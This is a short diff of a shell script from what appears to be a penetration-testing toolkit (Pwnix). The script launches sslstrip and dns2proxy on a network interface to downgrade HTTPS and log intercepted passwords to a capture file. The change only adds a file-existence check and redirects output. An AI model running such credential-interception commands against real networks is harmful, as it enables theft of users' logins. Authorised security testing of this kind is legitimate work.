@@ -40,9 +40,13 @@ f_run(){
 
   logfile=/opt/pwnix/captures/passwords/sslstrip_$(date +%F-%H%M).log
 
-  cd /usr/share/mana-toolkit/sslstrip-hsts
-  python /usr/share/mana-toolkit/sslstrip-hsts/dns2proxy.py $interface &
-  /usr/bin/sslstrip -pfk -w $logfile  -l 8888 $interface 2> /dev/null &
+  if [ -f /usr/share/mana-toolkit/sslstrip-hsts/dns2proxy.py ]; then
+    cd /usr/share/mana-toolkit/sslstrip-hsts
+    python /usr/share/mana-toolkit/sslstrip-hsts/dns2proxy.py $interface &
+  else
+    printf "dns2proxy is currently unavialable\n"
+  fi
+  /usr/bin/sslstrip -pfk -w $logfile  -l 8888 $interface > /dev/null 2>&1 &
 
   sleep 3
   printf "\n\n"
